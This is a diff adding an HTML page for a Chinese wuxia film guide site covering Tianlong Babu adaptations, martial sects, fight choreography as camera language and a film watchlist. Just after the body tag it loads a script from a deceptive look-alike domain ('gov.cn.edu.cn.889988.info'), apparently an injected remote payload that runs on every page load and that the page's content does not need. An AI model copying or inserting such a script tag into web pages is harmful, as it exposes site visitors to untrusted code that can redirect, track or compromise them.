@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>天龙电影网 - 武侠/天龙八部/江湖电影片库 · 门派·武功·群像</title>
+<meta name="description" content="天龙电影网(tianlongdianyingwang-h5.github.io)是武侠电影资料站：天龙八部改编、门派武学、江湖群像、武侠片单与拉片笔记。不提供盗版播放，只做武侠影像图谱。">
+<meta name="keywords" content="天龙电影网, tianlongdianyingwang-h5, 天龙八部电影, 武侠电影, 江湖片库, 门派武学, 武侠片单">
+<meta name="author" content="天龙电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#1c1a17;
+  --ink-soft:#5b5247;
+  --paper:#f5efe1;
+  --paper-2:#ece2cd;
+  --red:#9c2b1f;
+  --red-soft:#c0582f;
+  --jade:#3f5d3a;
+  --gold:#b9892f;
+  --line:rgba(28,26,23,0.14);
+  --card:#fffdf7;
+  --shadow:0 6px 20px rgba(28,26,23,0.12);
+  --shadow-lg:0 16px 44px rgba(156,43,31,0.18);
+  --radius:18px;
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Serif SC","Songti SC","PingFang SC",serif;background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(460px 460px at 8% 10%,rgba(156,43,31,.08),transparent 60%),
+  radial-gradient(420px 420px at 92% 18%,rgba(63,93,58,.08),transparent 60%),
+  linear-gradient(180deg,#f5efe1,#ece2cd);}
+/* 飘墨点 */
+.ink{position:fixed;width:10px;height:10px;border-radius:50%;background:rgba(28,26,23,.18);z-index:0;animation:rise 14s linear infinite}
+@keyframes rise{0%{transform:translateY(110vh) scale(.6)}100%{transform:translateY(-10vh) scale(1.2)}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(245,239,225,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem}
+.brand .seal{width:34px;height:34px;border-radius:8px;background:linear-gradient(135deg,var(--red),var(--red-soft));color:#fff;display:flex;align-items:center;justify-content:center;font-family:serif}
+.brand b{color:var(--red)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 14px;border-radius:8px;font-size:.84rem;font-weight:600;color:var(--ink-soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(156,43,31,.1);color:var(--red)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--red);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:76px 20px 54px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;color:var(--red);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.hero h1{font-size:clamp(2rem,4.2vw,3.2rem);font-weight:900;line-height:1.16;margin:14px 0 8px}
+.hero h1 .brush{color:var(--red);text-shadow:2px 6px 0 rgba(185,137,47,.25)}
+.hero p{color:var(--ink-soft);font-size:1rem;margin:14px 0 24px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--red),var(--red-soft));color:#fff}
+.btn-main:hover{transform:translateY(-2px);box-shadow:var(--shadow-lg)}
+.btn-line{background:transparent;border:2px solid var(--red);color:var(--red)}
+.hero-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:24px;box-shadow:var(--shadow-lg)}
+.hero-card h3{font-size:.95rem;margin-bottom:10px;color:var(--red)}
+.hero-card p{font-size:.78rem;color:var(--ink-soft);line-height:1.65}
+.hero-card .ok{color:var(--jade);font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--red)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:var(--ink-soft);margin-bottom:30px}
+.divider{height:2px;background:repeating-linear-gradient(90deg,var(--ink) 0 14px,transparent 14px 26px);opacity:.25;margin:8px 0 26px}
+
+/* 门派 */
+.sect-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:20px}
+.sect{background:var(--card);border-radius:var(--radius);padding:22px;box-shadow:var(--shadow);border-top:4px solid var(--gold);transition:.3s}
+.sect:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.sect .ico{font-size:2rem}
+.sect h3{font-size:1rem;font-weight:800;margin:8px 0 6px}
+.sect p{font-size:.76rem;color:var(--ink-soft);line-height:1.6}
+.sect .film{margin-top:8px;font-size:.72rem;color:var(--jade);font-weight:600}
+
+/* 武功/镜头 */
+.wugong{background:rgba(63,93,58,.06)}
+.wg-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px}
+.wg{background:var(--card);border-radius:14px;padding:22px;box-shadow:var(--shadow);border-left:4px solid var(--red)}
+.wg h3{font-size:.95rem;font-weight:800;margin-bottom:6px}
+.wg p{font-size:.76rem;color:var(--ink-soft);line-height:1.65}
+.wg .map{margin-top:8px;font-size:.72rem;color:var(--gold);font-weight:600}
+
+/* 群像 */
+.cast-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
+.cast{background:var(--card);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:.3s}
+.cast:hover{transform:translateY(-4px);box-shadow:var(--shadow-lg)}
+.cast-cover{height:140px;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff}
+.cast:nth-child(1) .cast-cover{background:linear-gradient(135deg,#1c1a17,#5b5247)}
+.cast:nth-child(2) .cast-cover{background:linear-gradient(135deg,#9c2b1f,#c0582f)}
+.cast:nth-child(3) .cast-cover{background:linear-gradient(135deg,#3f5d3a,#b9892f)}
+.cast:nth-child(4) .cast-cover{background:linear-gradient(135deg,#244,#9c2b1f)}
+.cast:nth-child(5) .cast-cover{background:linear-gradient(135deg,#b9892f,#5b5247)}
+.cast:nth-child(6) .cast-cover{background:linear-gradient(135deg,#c0582f,#3f5d3a)}
+.cast-body{padding:18px}
+.cast-body h3{font-size:.98rem;font-weight:800}
+.cast-body p{font-size:.76rem;color:var(--ink-soft);line-height:1.6}
+.cast-body .tag{display:inline-block;margin-top:8px;font-size:.66rem;padding:3px 9px;border-radius:20px;background:rgba(156,43,31,.1);color:var(--red);font-weight:600}
+
+/* 片单 */
+.list{background:rgba(185,137,47,.06)}
+.film-row{display:grid;grid-template-columns:54px 1fr auto;gap:18px;align-items:center;background:var(--card);border-radius:14px;padding:16px 20px;box-shadow:var(--shadow);margin-bottom:14px;transition:.3s}
+.film-row:hover{transform:translateX(6px)}
+.film-no{font-size:1.5rem;font-weight:900;font-family:Georgia,serif;color:var(--red);text-align:center}
+.film-row h3{font-size:.95rem;font-weight:700}
+.film-row p{font-size:.74rem;color:var(--ink-soft)}
+.film-tag{padding:6px 12px;border-radius:20px;font-size:.7rem;font-weight:700;background:rgba(63,93,58,.14);color:var(--jade);white-space:nowrap}
+
+.footer{position:relative;z-index:1;background:var(--ink);color:var(--paper);padding:46px 20px 24px;margin-top:54px}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px}
+.footer a{display:block;font-size:.8rem;color:rgba(245,239,225,.65);padding:3px 0}
+.footer a:hover{color:var(--red-soft)}
+.footer p{font-size:.82rem;color:rgba(245,239,225,.72);line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(245,239,225,.5);padding-top:18px;border-top:1px solid rgba(245,239,225,.15)}
+.footer-bottom a{color:var(--red-soft);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-card{order:-1}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(245,239,225,.97);padding:12px 20px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .film-row{grid-template-columns:42px 1fr;gap:10px}.film-tag{grid-column:2;justify-self:start}
+  .footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div>
+<script>
+for(var i=0;i<14;i++){var s=document.createElement('div');s.className='ink';
+s.style.left=Math.random()*100+'vw';s.style.animationDuration=(10+Math.random()*8)+'s';
+s.style.animationDelay=(-Math.random()*10)+'s';document.body.appendChild(s);}
+</script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="seal">龍</span>天龙<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#sects">门派武学</a>
+      <a href="#wugong">武功与镜头</a>
+      <a href="#casts">江湖群像</a>
+      <a href="#list">武侠片单</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">WUXIA · TIANLONG · JIANGHU</span>
+      <h1>一页宣纸，<br>展开整座<span class="brush">江湖</span>。</h1>
+      <p>天龙电影网（tianlongdianyingwang-h5.github.io）不是播放站，是武侠影像图谱：天龙八部改编脉络、门派武学、镜头里的掌法与剑意、乔峰/段誉/虚竹式的人物命运。</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">🗡️ 进门派武学</button>
+        <button class="btn btn-line">🎬 看武侠片单</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>本站规矩</h3>
+      <p><span class="ok">✓</span> 武侠电影/剧集资料、拉片、门派图谱<br>
+      <span class="ok">✓</span> 不挂盗版播放器、不仿冒登录框<br>
+      <span class="ok">✓</span> 天龙八部相关改编按公开资料整理<br>
+      <span class="ok">✓</span> 墨黑朱砂枯金，卷轴式中国武侠 UI</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="sects">
+  <div class="label">— SCHOOLS & CLANS —</div>
+  <h2 class="title">门派武学：每派都是一种电影语法</h2>
+  <p class="desc">少林讲因果，丐帮讲众生，逍遥派讲意境，星宿派讲邪典。</p>
+  <div class="divider"></div>
+  <div class="sect-grid">
+    <div class="sect"><div class="ico">🪷</div><h3>少林</h3><p>长镜头、苦修、因果剪辑。把“顿悟”拍成一场默戏，不动手先动心。</p><div class="film">代表：武侠里的禅师/扫地僧型角色</div></div>
+    <div class="sect"><div class="ico">🥢</div><h3>丐帮</h3><p>群像、泥泞、江湖底层。镜头爱用广角，把“天下第一大帮”拍成流浪史诗。</p><div class="film">代表：乔峰/帮众/酒肆夜雨</div></div>
+    <div class="sect"><div class="ico">🍃</div><h3>逍遥派</h3><p>轻功即运镜，山水即情绪。唯美派：雾、琴、鹤、卷轴转场。</p><div class="film">代表：天山、缥缈峰、北冥神功</div></div>
+    <div class="sect"><div class="ico">☠️</div><h3>星宿派</h3><p>邪典感、谄媚、绿雾毒云。适合做讽刺武侠／黑色武侠的视觉母题。</p><div class="film">代表：丁春秋式反派狂欢</div></div>
+    <div class="sect"><div class="ico">⚔️</div><h3>大理段氏</h3><p>皇族+佛理+一阳指。色彩用金与朱砂，讲“帝王身、菩萨心”。</p><div class="film">代表：段誉、六脉神剑、大理风光</div></div>
+    <div class="sect"><div class="ico">🐍</div><h3>灵鹫宫</h3><p>高处、女权、禁地。垂直构图+冷蓝雪色，江湖里的“天上宫殿”。</p><div class="film">代表：虚竹、生死符、缥缈录</div></div>
+  </div>
+</div>
+
+<div class="container wugong" id="wugong">
+  <div class="label">— MARTIAL MOVES AS CINEMA —</div>
+  <h2 class="title">把武功翻译成镜头语言</h2>
+  <p class="desc">武侠片好不好，不看谁飞得高，看“动作有没有文人气”。</p>
+  <div class="divider"></div>
+  <div class="wg-grid">
+    <div class="wg"><h3>降龙十八掌</h3><p>不是特效堆砌，而是“蓄力—出框—余震”。用推镜头+鼓点静音，把掌风拍成山崩。</p><div class="map">镜头：慢推 + 定格余波</div></div>
+    <div class="wg"><h3>六脉神剑</h3><p>指气如剪接：看不见的刀，靠声音设计与光点位移完成。东方版“子弹时间”。</p><div class="map">镜头：光点追踪 + 声画对位</div></div>
+    <div class="wg"><h3>北冥神功</h3><p>吸内力=吸时间。长镜头里人物越走越轻，配乐越空，观众被“抽空”。</p><div class="map">镜头：旋转长镜 + 消音</div></div>
+    <div class="wg"><h3>凌波微步</h3><p>步法即调度。演员走位提前半拍，摄影机追不上，江湖就有了“仙气”。</p><div class="map">镜头：跟拍失位 + 水面倒影</div></div>
+    <div class="wg"><h3>生死符</h3><p>寒毒入梦，适合心理惊悚式武侠。用冷调闪回、皮肤特写、碎冰音效。</p><div class="map">镜头：微距 + 寒音设计</div></div>
+    <div class="wg"><h3>打狗棒法</h3><p>棍法讲章法，像剪辑节奏：点、挑、缠、劈。丐帮的“平民武术美学”。</p><div class="map">镜头：手持 + 街市纵深</div></div>
+  </div>
+</div>
+
+<div class="container" id="casts">
+  <div class="label">— JIANGHU PORTRAITS —</div>
+  <h2 class="title">江湖群像：天龙三兄弟的影像命数</h2>
+  <p class="desc">乔峰是悲剧史诗，段誉是文人游历，虚竹是佛理喜剧。</p>
+  <div class="divider"></div>
+  <div class="cast-grid">
+    <div class="cast"><div class="cast-cover">🦅</div><div class="cast-body"><h3>乔峰 / 萧峰</h3><p>英雄被身份撕开。宽银幕、风雪、群战一镜到底，最适合讲“侠之大者”的坠落。</p><span class="tag">悲剧史诗 · 民族身份</span></div></div>
+    <div class="cast"><div class="cast-cover">📜</div><div class="cast-body"><h3>段誉</h3><p>书生闯江湖。轻喜剧运镜、大理绿调、瀑布与佛寺，欲望与佛法并行。</p><span class="tag">文人游历 · 喜剧</span></div></div>
+    <div class="cast"><div class="cast-cover">🧩</div><div class="cast-body"><h3>虚竹</h3><p>笨人得道。镜头从混沌到澄明，灵鹫宫雪夜像一场禅宗动画。</p><span class="tag">佛理 · 逆袭</span></div></div>
+    <div class="cast"><div class="cast-cover">🐍</div><div class="cast-body"><h3>慕容复</h3><p>复兴狂想者。对称构图+空镜王陵，把“执念”拍成反复出现的镜中像。</p><span class="tag">权力执念 · 镜像</span></div></div>
+    <div class="cast"><div class="cast-cover">🌸</div><div class="cast-body"><h3>王语嫣</h3><p>“会武学但不会打”的元角色。她让镜头变成辞典：招式在她嘴里先演一遍。</p><span class="tag">武学辞典 · 凝视</span></div></div>
+    <div class="cast"><div class="cast-cover">🍷</div><div class="cast-body"><h3>阿朱 / 阿紫</h3><p>一柔一烈，朱砂与紫癜。用姐妹对照讲“爱是替身，还是命数”。</p><span class="tag">双生 · 牺牲与执念</span></div></div>
+  </div>
+</div>
+
+<div class="container list" id="list">
+  <div class="label">— WUXIA WATCHLIST —</div>
+  <h2 class="title">武侠/天龙系 观影路线图</h2>
+  <p class="desc">从原著改编、港式武侠到新武侠美学，一条线看懂“江湖怎么被拍出来”。</p>
+  <div class="divider"></div>
+  <div class="film-row"><div class="film-no">01</div><div><h3>天龙八部（经典剧集版）</h3><p>群像骨架：乔峰线、段誉线、虚竹线三线汇成“无人不冤，有情皆孽”。</p></div><div class="film-tag">群像史诗</div></div>
+  <div class="film-row"><div class="film-no">02</div><div><h3>天龙八部之乔峰传（电影）</h3><p>把最大悲剧角色单拎出来，适合研究“英雄片”如何被重新剪裁。</p></div><div class="film-tag">英雄改写</div></div>
+  <div class="film-row"><div class="film-no">03</div><div><h3>新龙门客栈</h3><p>大漠、客栈、权力缝隙。武侠空间的教科书：封闭场景里所有人都是赌徒。</p></div><div class="film-tag">空间武侠</div></div>
+  <div class="film-row"><div class="film-no">04</div><div><h3>卧虎藏龙</h3><p>竹林、屋顶、青冥剑。文人武侠走向世界：动作是礼，欲望是险。</p></div><div class="film-tag">文人武侠</div></div>
+  <div class="film-row"><div class="film-no">05</div><div><h3>东邪西毒</h3><p>武侠外壳下的记忆蒙太奇。适合用“电影符号学”拉片。</p></div><div class="film-tag">作者武侠</div></div>
+  <div class="film-row"><div class="film-no">06</div><div><h3>绣春刀</h3><p>明末锦衣卫的泥泞江湖。武打去仙气、回人间，刀刀有公务与生计。</p></div><div class="film-tag">历史武侠</div></div>
+  <div class="film-row"><div class="film-no">07</div><div><h3>师父</h3><p>天津卫、门派利益、拳脚契约。讲“武林怎么死”的元武侠片。</p></div><div class="film-tag">门派社会学</div></div>
+  <div class="film-row"><div class="film-no">08</div><div><h3>刺客聂隐娘</h3><p>侯孝贤式留白武侠：人不解释，风解释；剑不出鞘，山解释。</p></div><div class="film-tag">极简武侠</div></div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="seal">龍</span>天龙<b>电影网</b></div>
+        <p>天龙电影网（tianlongdianyingwang-h5.github.io）做武侠电影图谱：天龙八部改编、门派武学、武功镜头化、江湖群像与武侠片单。不播盗版，不仿登录，只展卷说江湖。</p>
+      </div>
+      <div><h4>逛站</h4><a href="#sects">门派武学</a><a href="#wugong">武功与镜头</a><a href="#casts">江湖群像</a><a href="#list">武侠片单</a></div>
+      <div><h4>主题</h4><a href="#">天龙八部</a><a href="#">港式武侠</a><a href="#">新武侠</a><a href="#">文人武侠</a></div>
+      <div><h4>说明</h4><a href="#">内容立场</a><a href="#">版权与引用</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 天龙电影网 (Tianlong Movie Network) - 武侠影像图谱 · 天龙八部 · 江湖群像</p>
+      <p>网站地址：<a href="https://tianlongdianyingwang-h5.github.io">https://tianlongdianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">影片/剧集信息来自公开资料与改编脉络整理；本站不提供未授权播放资源。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
